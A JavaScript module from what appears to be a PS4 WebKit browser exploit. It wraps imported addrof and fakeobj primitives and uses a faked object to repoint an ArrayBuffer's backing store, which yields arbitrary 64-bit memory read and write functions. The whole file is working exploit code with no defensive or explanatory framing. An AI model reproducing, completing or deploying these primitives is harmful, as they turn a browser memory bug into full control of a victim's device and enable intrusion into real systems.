import { addrof as _addrof, fakeobj as _fakeobj, findBackingStoreOffset } from './exploit.js';

// mem.js
// Memory read/write primitives for PS4 WebKit exploit

let initialized = false;
let BS_OFFSET, buf, dv, bsPtrAddr;

/**
 * Initialize memory primitives by finding the backing store offset and setting up DataView
 */
export async function initMemory(log) {
    BS_OFFSET = await findBackingStoreOffset(log);
    log(`Backing store offset = 0x${BS_OFFSET.toString(16)}`);
    buf = new ArrayBuffer(0x100);
    dv = new DataView(buf);
    const bufAddr = _addrof(buf);
    bsPtrAddr = bufAddr + BS_OFFSET;
    initialized = true;
}

export function addrof(obj) {
    return _addrof(obj);
}

export function fakeobj(addr) {
    return _fakeobj(addr);
}

export function read64(addr) {
    if (!initialized) throw new Error('mem.js not initialized');
    // Point backing store to target address
    const fake = _fakeobj(bsPtrAddr);
    fake[0] = BigInt(addr);
    return dv.getBigUint64(0, true);
}

export function write64(addr, value) {
    if (!initialized) throw new Error('mem.js not initialized');
    // Point backing store to target address
    const fake = _fakeobj(bsPtrAddr);
    fake[0] = BigInt(addr);
    dv.setBigUint64(0, BigInt(value), true);
}
